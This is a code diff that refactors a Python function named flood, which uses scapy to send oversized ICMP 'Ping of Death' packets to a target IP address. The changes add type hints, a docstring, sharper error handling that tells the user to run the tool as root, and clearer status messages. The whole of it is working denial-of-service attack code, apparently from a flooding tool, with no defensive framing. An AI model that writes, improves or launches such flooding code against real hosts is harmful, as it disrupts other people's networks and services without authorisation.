@@ -1,23 +1,34 @@
 # Import modules
 import random
-from scapy.all import IP, ICMP, send, fragment
+from scapy.all import IP, ICMP, send
+
 from colorama import Fore
 
-__letters = list("1234567890qwertyuiopasdfghjklzxcvbnm")
+_LETTERS = list("1234567890qwertyuiopasdfghjklzxcvbnm")
 
 
-def flood(target):
-    payload = random.choice(__letters) * 60000
+def flood(target: tuple[str, int]) -> None:
+    """Send Ping of Death packets to target.
+    
+    Args:
+        target: Tuple of (ip_address, port)
+    """
+    payload = random.choice(_LETTERS) * 60000
     packet = IP(dst=target[0]) / ICMP(id=65535, seq=65535) / payload
 
-    for i in range(4):
+    for _ in range(4):
         try:
             send(packet, verbose=False)
-        except Exception as e:
+        except PermissionError:
             print(
-                f"{Fore.RED}[!] {Fore.MAGENTA}Error while sending 'Ping Of Death'\n{Fore.MAGENTA}{e}{Fore.RESET}"
+                f"{Fore.RED}[!] {Fore.MAGENTA}Permission denied. Run as administrator/root.{Fore.RESET}"
+            )
+            break
+        except OSError as e:
+            print(
+                f"{Fore.RED}[!] {Fore.MAGENTA}Network error while sending PoD: {e}{Fore.RESET}"
             )
         else:
             print(
-                f"{Fore.GREEN}[+] {Fore.YELLOW}65535 bytes send to {target[0]} {Fore.RESET}"
+                f"{Fore.GREEN}[+] {Fore.YELLOW}PoD packet ({len(payload)} bytes) sent to {target[0]}{Fore.RESET}"
             )
